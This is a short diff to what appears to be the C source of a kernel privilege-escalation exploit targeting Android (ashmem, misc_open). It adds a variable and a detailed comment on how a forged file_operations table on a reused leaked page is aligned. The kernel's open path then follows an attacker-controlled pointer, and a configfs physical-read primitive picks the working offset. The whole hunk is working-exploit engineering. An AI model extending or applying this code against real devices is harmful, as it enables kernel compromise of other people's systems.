@@ -988,6 +988,21 @@ uintptr_t fake_right;
 uintptr_t fake_left;
 uintptr_t fake_fops;
 size_t fops_voff;
+/* fix68 (2026-10-25): detected payload-page view, -1 = not yet probed.
+ * The page content's byte shift relative to the userspace buf is a per-run
+ * lottery (which skb fragment wins the freelist reuse of the leaked page):
+ * boot b082adf8 carried the buf shifted right one byte (kernel blr at
+ * misc_open read *(fake+0x71) == canonical open pointer); boot 24e39de8
+ * carried it byte-aligned (the same read returned open>>8 =
+ * 0x00ffffffd36ade2f -> SP/PC alignment exception, lr=misc_open+0x140,
+ * panic).  KS_PSELECT_FOPS_VOFF pinned voff=1 which only fits the shifted
+ * page; every unshifted page died in misc_open.  do_pselect_fake_lock_route
+ * probes both candidate slots through the standing configfs read (exact
+ * physical read: page=target-pos + pread pos lands on kernel VA target, no
+ * channel shift) and pins fops_voff to the view that actually holds the
+ * canonical pointer.  0 -> kernel reads *(fake+off)=buf[off]; 1 -> kernel
+ * reads *(fake+1+off)=buf[off] on the shifted page. */
+int fops_voff_detected = -1;
 uintptr_t binwrite_target;
 char ashmem_path[256] = "/dev/ashmem";
 
